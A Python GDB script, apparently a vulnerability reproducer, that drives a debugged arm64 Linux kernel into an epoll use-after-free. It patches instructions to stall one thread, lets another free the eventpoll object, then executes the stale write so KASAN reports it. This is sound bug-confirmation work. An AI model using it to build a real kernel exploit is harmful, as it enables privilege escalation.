import gdb
import time

def run_race():
    print("\n=== STARTING CONTROLLED UAF RACE EXPERIMENT ===\n")
    
    ep_remove_store = 0xffffffc0083bcfd8
    ep_remove_patch1 = 0xffffffc0083bcfdc
    ep_remove_patch2 = 0xffffffc0083bcfe0
    
    orig_insn1 = 0x91006000 # add x0, x0, #0x18
    orig_insn2 = 0xeb00005f # cmp x2, x0
    
    dmb_sy_insn = 0xd5033fbf # dmb sy
    spin_insn = 0x14000000   # b .
    
    uaf_write_addr = 0xffffffc0083bcedc
    ep_free_addr = 0xffffffc0083bd0a8
    kfree_call_addr = 0xffffffc0083bd1c4
    
    gdb.execute("set pagination off")
    gdb.execute("target remote :1234")
    
    # 1. Break at f_ep = NULL store
    print("[*] Setting breakpoint at ep_remove (f_ep = NULL)")
    gdb.execute(f"break *{ep_remove_store}")
    
    # Wait for the exact ep_remove that targets our inner_epoll (where f_op == eventpoll_fops)
    while True:
        gdb.execute("continue")
        pc = int(gdb.parse_and_eval("$pc"))
        if pc == ep_remove_store:
            x24 = int(gdb.parse_and_eval("$x24")) & 0xffffffffffffffff
            f_op = int(gdb.parse_and_eval(f"*(unsigned long *)({x24} + 0x28)")) & 0xffffffffffffffff
            if f_op == 0xffffffc009397b78:  # eventpoll_fops
                print("[*] Hit ep_remove on an epoll file!")
                break
            else:
                print(f"[*] Hit ep_remove on non-epoll file. Continuing...")
    
    # We hit the store. Thread A is now here.
    gdb.execute(f"clear *{ep_remove_store}")
    
    thread_a = gdb.selected_thread().num
    x24 = int(gdb.parse_and_eval("$x24"))
    inner_epoll = int(gdb.parse_and_eval(f"*(unsigned long *)({x24} + 0xc8)")) & 0xffffffffffffffff
    print(f"[*] Thread A: {thread_a}")
    print(f"[*] inner_epoll: {hex(inner_epoll)}")
    
    # 2. Patch instructions to dmb sy; b .
    print(f"[*] Patching instruction at {hex(ep_remove_patch1)} to dmb sy (0xd5033fbf)")
    gdb.execute(f"set {{unsigned int}}{ep_remove_patch1} = {dmb_sy_insn}")
    print(f"[*] Patching instruction at {hex(ep_remove_patch2)} to b . (0x14000000)")
    gdb.execute(f"set {{unsigned int}}{ep_remove_patch2} = {spin_insn}")
    
    # 3. Set breakpoint at ep_free
    print("[*] Setting breakpoint at ep_free")
    gdb.execute(f"break *{ep_free_addr}")
    
    while True:
        print("[*] Continuing execution... waiting for Thread B to hit ep_free")
        gdb.execute("continue")
        
        hit = False
        for thr in gdb.selected_inferior().threads():
            if not thr.is_valid(): continue
            thr.switch()
            pc = int(gdb.parse_and_eval("$pc"))
            if pc == ep_free_addr:
                hit = True
                break
                
        if hit:
            ep_arg = int(gdb.parse_and_eval("$x0")) & 0xffffffffffffffff
            if ep_arg == inner_epoll:
                print(f"[*] Thread B successfully reached ep_free(inner_epoll)!")
                break
            else:
                print(f"[!] Thread B hit ep_free, but with different ep (0x{ep_arg:x}). Continuing...")
        else:
            print(f"[!] Stopped, but no thread is at ep_free. Continuing...")
            
    # 4. Thread B reached ep_free. Let's make sure it finishes kfree.
    gdb.execute(f"clear *{ep_free_addr}")
    print("[*] Setting breakpoint after kfree")
    gdb.execute(f"break *{kfree_call_addr + 4}")
    gdb.execute("continue")
    gdb.execute(f"clear *{kfree_call_addr + 4}")
    print(f"[*] SUCCESS: Thread B finished kfree(inner_epoll)")
        
    # 5. Restore Thread A's instructions and set its PC back to the cmp instruction
    print(f"[*] Switching back to Thread A ({thread_a})")
    gdb.execute(f"thread {thread_a}")
    
    print(f"[*] Restoring original instructions")
    gdb.execute(f"set {{unsigned int}}{ep_remove_patch1} = {orig_insn1}")
    gdb.execute(f"set {{unsigned int}}{ep_remove_patch2} = {orig_insn2}")
    
    print(f"[*] Forcing Thread A PC back to {hex(ep_remove_patch1)}")
    gdb.execute(f"set $pc = {ep_remove_patch1}")
    
    # 6. Break at UAF write
    print("[*] Setting breakpoint at UAF write instruction")
    gdb.execute(f"break *{uaf_write_addr}")
    gdb.execute("continue")
    
    pc = int(gdb.parse_and_eval("$pc"))
    if pc == uaf_write_addr:
        print("[*] SUCCESS: Thread A hit UAF write")
        x0 = int(gdb.parse_and_eval("$x0")) & 0xffffffffffffffff
        x2 = int(gdb.parse_and_eval("$x2")) & 0xffffffffffffffff
        print(f"[*] TARGET ADDRESS (x0): {hex(x0)}")
        print(f"[*] VALUE TO WRITE (x2): {hex(x2)}")
        print(f"[*] EXPECTED TARGET: {hex(inner_epoll + 0xa0)}")
        
        if x0 == inner_epoll + 0xa0:
            print("[*] EXACT MATCH! The write targets the freed inner_epoll allocation.")
            
        print("\n=== EXECUTING UAF WRITE ===")
        gdb.execute("stepi")
        print("=== UAF WRITE EXECUTED ===\n")
        
        print("[*] Resuming execution to allow KASAN report to print...")
        try:
            gdb.execute("continue")
        except gdb.error as e:
            print(f"[*] GDB Error during continue: {e}")
    else:
        print(f"[!] Thread A stopped at {hex(pc)} instead of UAF write")

try:
    run_race()
except Exception as e:
    import traceback
    traceback.print_exc()

gdb.execute("quit")
